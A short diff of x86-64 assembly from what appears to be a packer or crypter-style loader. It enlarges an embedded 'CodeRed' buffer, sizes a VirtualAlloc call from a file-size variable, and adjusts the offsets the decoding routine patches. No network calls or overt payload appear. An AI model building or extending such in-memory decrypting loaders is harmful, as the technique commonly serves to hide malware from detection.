@@ -177,7 +177,7 @@ section .data
 	tm times 8 dq 0
 
 section .codered 
- CodeRed times 800000                             db 0:
+ CodeRed times 80000000                             db 0:
 
 section .deccode	
 	decCode:
@@ -237,11 +237,20 @@ section .deccode
 	mov r12,rax
 	add rsp, 0x30
 	add rsp, 0x10
-		
+	
+
+	mov rax, [bool]
+	cmp rax, 0
+	jle tam2
+	jmp continue
+	tam2:
+	mov rax, [tamArq]
+	mov [TamArqTarget], rax
+	continue:
 	;call VirtualAlloc
 	mov r9d, 0x04
 	mov r8d, 0x1000
-	mov rdi, 0xC3500
+	mov rdi, [TamArqTarget]
 	mov edx, edi
 	mov ecx, 0x00
 	call r12
@@ -837,14 +846,14 @@ section .deccode
 		add rax, 0x400
 		mov [rax], byte 0x00
 		sub rax, 0x400
-		add rax, 0xC3C00
+		add rax, 0x04C4BA00
 		add rax, 0x36
 		mov [rax], dword 0x240
 		sub rax, 0x36
 		add rax, 0xA7
 		mov [rax], dword 0x240
 		sub rax, 0xA7
-		sub rax, 0xC3C00
+		sub rax, 0x04C4BA00
 		
 		add rax, 0x400
 		add rax, 0x08
